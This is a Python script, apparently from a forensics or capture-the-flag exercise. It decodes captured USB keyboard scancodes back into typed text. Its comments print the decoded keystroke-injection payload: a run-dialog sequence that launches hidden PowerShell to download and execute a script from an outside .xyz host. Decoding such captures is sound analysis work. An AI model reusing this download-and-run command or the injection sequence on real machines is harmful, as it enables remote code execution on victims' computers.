#!/usr/bin/env python3
scancodes = [
    (0x0, 0x0),
    (0x15, 0x8),
    (0x13, 0x0),
    (0x12, 0x0),
    (0x1a, 0x0),
    (0x8, 0x0),
    (0x15, 0x0),
    (0x16, 0x0),
    (0xb, 0x0),
    (0x8, 0x0),
    (0xf, 0x0),
    (0xf, 0x0),
    (0x2c, 0x0),
    (0x2d, 0x0),
    (0x11, 0x0),
    (0x12, 0x0),
    (0x13, 0x0),
    (0x15, 0x0),
    (0x12, 0x0),
    (0x9, 0x0),
    (0xc, 0x0),
    (0xf, 0x0),
    (0x8, 0x0),
    (0x2c, 0x0),
    (0x2d, 0x0),
    (0x1a, 0x0),
    (0xc, 0x0),
    (0x11, 0x0),
    (0x7, 0x0),
    (0x12, 0x0),
    (0x1a, 0x0),
    (0x16, 0x0),
    (0x17, 0x0),
    (0x1c, 0x0),
    (0xf, 0x0),
    (0x8, 0x0),
    (0x2c, 0x0),
    (0xb, 0x0),
    (0xc, 0x0),
    (0x7, 0x0),
    (0x7, 0x0),
    (0x8, 0x0),
    (0x11, 0x0),
    (0x2c, 0x0),
    (0x2d, 0x0),
    (0x6, 0x0),
    (0x12, 0x0),
    (0x10, 0x0),
    (0x10, 0x0),
    (0x4, 0x0),
    (0x11, 0x0),
    (0x7, 0x0),
    (0x2c, 0x0),
    (0x34, 0x20),
    (0xc, 0x0),
    (0x1a, 0x0),
    (0x15, 0x0),
    (0x2c, 0x0),
    (0x11, 0x0),
    (0x10, 0x0),
    (0x7, 0x0),
    (0x9, 0x0),
    (0x17, 0x0),
    (0xb, 0x0),
    (0x18, 0x0),
    (0x9, 0x0),
    (0xd, 0x0),
    (0x16, 0x0),
    (0xe, 0x0),
    (0x7, 0x0),
    (0x11, 0x0),
    (0x5, 0x0),
    (0x9, 0x0),
    (0x1a, 0x0),
    (0xb, 0x0),
    (0x8, 0x0),
    (0xd, 0x0),
    (0xe, 0x0),
    (0xf, 0x0),
    (0x4, 0x0),
    (0x6, 0x0),
    (0x10, 0x0),
    (0x16, 0x0),
    (0x37, 0x0),
    (0x1b, 0x0),
    (0x1c, 0x0),
    (0x1d, 0x0),
    (0x38, 0x0),
    (0x2d, 0x0),
    (0x13, 0x0),
    (0x16, 0x0),
    (0x31, 0x20),
    (0xc, 0x0),
    (0x8, 0x0),
    (0x1b, 0x0),
    (0x34, 0x20),
    (0x28, 0x0),
]
mappings = {
    'a': 4,
    'b': 5,
    'c': 6,
    'd': 7,
    'e': 8,
    'f': 9,
    'g': 10,
    'h': 11,
    'i': 12,
    'j': 13,
    'k': 14,
    'l': 15,
    'm': 16,
    'n': 17,
    'o': 18,
    'p': 19,
    'q': 20,
    'r': 21,
    's': 22,
    't': 23,
    'u': 24,
    'v': 25,
    'w': 26,
    'x': 27,
    'y': 28,
    'z': 29,
    '1': 30,
    '2': 31,
    '3': 32,
    '4': 33,
    '5': 34,
    '6': 35,
    '7': 36,
    '8': 37,
    '9': 38,
    '0': 39,
    '\n': 40,
    ' ': 44,
    '<F1>': 58,
    '<F2>': 59,
    '<F3>': 60,
    '<F4>': 61,
    '<F5>': 62,
    '<F6>': 63,
    '<F7>': 64,
    '<F8>': 65,
    '<F9>': 66,
    '<F10>': 67,
    '<F11>': 68,
    '<F12>': 69,
    '<ARROW_UP>': 82,
    '<ARROW_DOWN>': 81,
    '<ARROW_LEFT>': 80,
    '<ARROW_RIGHT>': 79,
    '-': 0x2d,
    '\'': 0x34,
    '.': 0x37,
    '/': 0x38,
    '\\': 0x31,
    '<INIT>': 0x0,
}


def resolve(scancode, mod):
    key = rev_mappings[scancode]
    if mod == 8:
        key += '<META>' + key
    elif mod == 0x20:
        if key == '\'':
            key = '"'
        elif key == '\\':
            key = '|'
        else:
            raise Exception((key, mod))
    elif mod != 0:
        raise Exception((key, mod))
    return key


rev_mappings = {v: k for k, v in mappings.items()}
print(''.join(resolve(scancode, mod) for scancode, mod in scancodes))

# \x00R
# POWERSHELL -NOPROFILE -WINDOWSTYLE HIDDEN -COMMAND 'IWR NMDFTHUFJSKDNBFWHEJKLACMS.XYZ?-PS|IEX'
# <INIT>r<META>rpowershell -noprofile -windowstyle hidden -command "iwr nmdfthufjskdnbfwhejklacms.xyz/-ps|iex"
